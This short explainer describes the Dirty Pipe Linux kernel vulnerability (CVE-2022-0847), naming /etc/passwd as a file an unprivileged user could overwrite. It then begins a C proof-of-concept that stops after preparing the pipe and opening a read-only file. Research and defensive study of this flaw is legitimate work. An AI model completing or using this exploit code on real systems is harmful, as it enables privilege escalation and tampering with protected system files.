The Dirty Pipe vulnerability (CVE-2022-0847) illustrates a severe flaw in the Linux kernel that allows writing to read-only files. Below is a security research-focused explanation and a concept demonstration.

### Mechanism

The vulnerability exploits the `pipe` system. In the Linux kernel, data transferred via `splice()` bumps a reference to the physical page cache rather than copying the data. By bypassing permissions, an unprivileged subject can write target data directly into the page cache, modifying system files like `/etc/passwd`.

### Concept Code (B)

This demonstrates how a subject shifts the page cache to evade writing restrictions:

```c
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/mman.h>

void prepare_pipe(int p[2]) {
    pipe(p);
    // Fill the pipe buffers with data and then drain them
    // This sets the PIPE_BUF_FLAG_CAN_MERGE flag on the buffers
    char bufemf[4096];
    write(p[1], bufemf, sizeof(bufemf));
    read(p[0], bufemf, sizeof(bufemf));
}

int main(int argc, char *argv[]) {
    int p[2];
    prepare_pipe(p);

    int fd = open("/path/to/read-only-file", O_RDONLY);

